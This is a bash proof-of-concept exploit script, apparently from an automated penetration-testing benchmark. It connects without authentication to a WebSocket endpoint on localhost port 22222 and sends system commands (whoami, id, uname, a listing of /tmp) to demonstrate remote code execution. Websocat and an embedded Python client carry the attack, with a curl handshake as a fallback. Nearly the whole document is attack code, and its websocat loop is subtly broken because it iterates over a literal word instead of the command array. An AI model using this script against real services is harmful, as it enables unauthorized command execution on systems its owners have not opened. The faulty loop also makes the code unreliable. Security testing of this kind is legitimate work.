#!/bin/bash
# POC: Demonstrates Remote Code Execution via unauthenticated WebSocket endpoint. Connects to ws://localhost:22222/ws and executes arbitrary system commands without authentication.
# Target: ./repo
# Created: 2025-11-04T17:08:45.153Z
# Session: benchmark-XBEN-023-24-mhktion0

# WebSocket RCE POC - Demonstrates unauthenticated command execution via WebSocket
# Target: ws://localhost:22222/ws
# This POC uses websocat (a command-line WebSocket client) to connect and send commands

TARGET_WS="ws://localhost:22222/ws"
TIMEOUT=5

echo "[*] WebSocket RCE Proof-of-Concept"
echo "[*] Target: $TARGET_WS"
echo ""

# Check if websocat is available
if ! command -v websocat &> /dev/null; then
    echo "[!] websocat not found. Attempting to install or use alternative method..."
    
    # Try using Python as alternative WebSocket client
    if command -v python3 &> /dev/null; then
        echo "[*] Using Python3 WebSocket client instead..."
        
        python3 << 'PYTHON_POC'
import websocket
import sys
import time

try:
    ws_url = "ws://localhost:22222/ws"
    print(f"[+] Connecting to {ws_url} without authentication...")
    
    ws = websocket.create_connection(ws_url, timeout=5)
    print("[+] Successfully connected to WebSocket!")
    print("[+] Connection established WITHOUT requiring any credentials")
    print("")
    
    # List of commands to test
    commands = ["whoami", "id", "uname -a", "ls -la /tmp"]
    
    for cmd in commands:
        print(f"[*] Executing command: {cmd}")
        ws.send(cmd)
        
        # Receive response with timeout
        ws.settimeout(2)
        try:
            response = ws.recv()
            print(f"[+] Response: {response}")
            print("")
        except websocket.WebSocketTimeoutException:
            print("[-] Timeout waiting for response")
            print("")
    
    ws.close()
    print("[+] WebSocket connection closed")
    print("[*] POC successful - RCE vulnerability confirmed!")
    
except ConnectionRefusedError:
    print("[-] Connection refused. Is the WebSocket server running on localhost:22222?")
    sys.exit(1)
except Exception as e:
    print(f"[-] Error: {e}")
    sys.exit(1)
PYTHON_POC
        exit $?
    fi
    
    echo "[-] Neither websocat nor Python3 found. Trying with curl for basic connectivity test..."
    
    # Fallback to curl test
    echo "[*] Testing WebSocket endpoint existence with curl..."
    curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
         -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
         -H "Sec-WebSocket-Version: 13" \
         http://localhost:22222/ws 2>&1 | head -20
    exit 0
fi

# Using websocat if available
echo "[*] Using websocat to connect to WebSocket..."
echo "[*] Testing unauthenticated connection..."
echo ""

# Test commands to execute
commands=("whoami" "id" "uname -a")

for cmd in commands; do
    echo "[*] Sending command: $cmd"
    echo "$cmd" | timeout $TIMEOUT websocat "$TARGET_WS" 2>&1 | head -5
    echo ""
done

echo "[+] POC complete - WebSocket RCE vulnerability demonstrated"